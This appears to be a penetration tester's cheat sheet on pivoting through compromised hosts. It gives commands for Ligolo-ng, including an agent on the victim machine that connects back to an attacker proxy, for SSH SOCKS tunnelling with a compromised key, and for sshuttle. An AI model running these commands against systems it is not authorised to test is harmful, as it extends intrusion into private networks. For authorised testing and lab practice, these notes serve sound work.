## Ligolo-ng
On the victim machine do (linux agent):
```
./agent -connect 10.10.15.4:11601 -ignore-cert
```
On attacker:
```
sudo ./proxy -selfcert
```
After getting Agent joined. Do:
```
session
```

```
autoroute
```
And select the route to add. Then create a new interface and select a random name.
## SSH Tunnelling
Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target.
```
ssh -vvv -D 9050 user@<IP> -i id_rsa
```
If a id_rsa key has been compromised. Instead use password, but authentication is required. Use verbose mode for troubleshooting.

## SSHuttle
In Kali Linux is so easy to install it.
```
sudo apt install sshuttle
```

To stablish a connection using an ==id_rsa== key, it's neccesary to specify the subnet.
```
sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i id_rsa" 10.200.180.0/24
```

Rather than specifying subnets, we could also use the `-N` option which attempts to determine them automatically based on the compromised server's own routing table:
```
sshuttle -r username@address -N
```


